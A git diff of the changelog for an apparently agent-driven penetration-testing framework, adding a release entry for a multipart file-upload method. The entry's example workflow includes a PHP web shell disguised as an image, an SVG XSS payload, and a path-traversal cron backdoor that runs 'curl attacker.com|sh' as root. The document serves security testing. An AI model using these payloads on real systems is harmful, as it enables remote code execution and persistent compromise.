@@ -1,5 +1,6 @@
 # Changelog
 
+- [0.6.0](#060--v4-phase-7-multipart-file-upload) — `upload()` on HttpClient for multipart/form-data file upload testing. Unrestricted upload, path traversal via filename, and SVG/HTML XSS now first-class operations. 1 method, 8 new tests, 0 regressions (722 tests)
 - [0.5.10](#0510--python-312-deprecation-fixes) — `asyncio.get_running_loop()` across all 15 deadline call sites in vuln.py, module-level credential pattern compilation. 0 new tests, 0 regressions (714 tests)
 - [0.5.9](#059--post-audit-correctness-fixes) — 3 correctness fixes from independent multi-agent audit: Kiterunner boost raw-URL lookup, `upsert_api_endpoint` silent host/path drop, `_redact` threshold. 5 new tests, 0 regressions (714 tests)
 - [0.5.8](#058--code-quality-audit--correctness-fixes) — 4 correctness fixes from production-readiness audit: `log_tool_run` missing hunt guard, PITCHFORK silent empty fuzz, nuclei string-reference drop, httpx port sentinel. 0 regressions (709 tests)
@@ -47,6 +48,71 @@
 - [0.2.1](#021--code-quality--correctness) — IPv6 scope handling, URL encoding for payloads, JSON decode safety, IDOR similarity, SQLi threshold, output bounding
 - [0.2.0](#020--interaction-browser-http--vulnerability-testing) — Browser automation, HTTP client, session management, OOB listeners, 5 vuln test tools, Nuclei adapter, CLI extensions
 - [0.1.0](#010--foundation-recon--enumeration) — Core framework, 8 tool adapters, scope engine, SQLite persistence, CLI
+
+---
+
+## 0.6.0 — V4 Phase 7: Multipart File Upload
+
+**Date:** 2026-04-06  
+**Scope:** 1 new method on `HttpClient`. Completes the V4 enrichment plan. 8 new tests, 0 regressions (722 tests pass).
+
+`HttpClient` previously had no way to send `multipart/form-data` requests without manually constructing the boundary encoding in a raw string body — an error-prone approach that required the agent to know the exact multipart wire format. The new `upload()` method accepts a typed `files` dict mapping field names to `(filename, content_bytes, content_type)` tuples, delegates boundary construction to httpx, and records a human-readable summary to HTTP history. File upload vulnerability testing (unrestricted upload → RCE, path traversal via filename, XSS via SVG/HTML) is now a first-class operation alongside `request()`, `fuzz()`, and `replay()`.
+
+This is the final phase of the [V4 enrichment plan](executing/v4-enrichment-plan.md). All seven phases are now shipped.
+
+### `upload()` — multipart/form-data file upload method
+
+> `src/boba/interaction/http.py`
+
+New method on `HttpClient`:
+
+```python
+async def upload(
+    self,
+    method: str,
+    url: str,
+    files: dict[str, tuple[str, bytes, str]],  # {field: (filename, content, content_type)}
+    fields: dict[str, str] | None = None,
+    headers: dict[str, str] | None = None,
+    cookies: dict[str, str] | None = None,
+    source: str = "http_client",
+    tags: list[str] | None = None,
+    follow_redirects: bool = True,
+    timeout_seconds: float | None = None,
+) -> HttpResponse:
+```
+
+Key design decisions:
+
+- **`files=` not `content=`**: passes `files=` and `data=` to httpx, which is what triggers multipart encoding with a generated boundary. `Content-Type: multipart/form-data; boundary=...` is set by httpx automatically — the method must not set it manually, or httpx skips boundary injection and the server rejects the request.
+- **History summary**: since there is no single string body, `request_body` in http_history is recorded as `<multipart: files=[...], fields=[...]>`. Stores file names (for audit) without storing raw file bytes (which would bloat SQLite).
+- **Full parity with `request()`**: network error handling, body size cap, redirect tracking, `timeout_seconds`, `tags`, and `source` all work identically.
+
+**Agent workflow:**
+
+```python
+# Unrestricted file upload (RCE)
+resp = await http_client.upload(
+    method="POST",
+    url="https://app.target.com/api/upload",
+    files={"avatar": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg")},
+    fields={"description": "Profile photo"},
+)
+
+# XSS via SVG upload
+resp = await http_client.upload(
+    method="POST",
+    url="https://app.target.com/api/upload",
+    files={"file": ("xss.svg", b'<svg><script>alert(1)</script></svg>', "image/svg+xml")},
+)
+
+# Path traversal via filename
+resp = await http_client.upload(
+    method="POST",
+    url="https://app.target.com/api/upload",
+    files={"file": ("../../../etc/cron.d/backdoor", b"* * * * * root curl attacker.com|sh", "text/plain")},
+)
+```
 
 ---
 
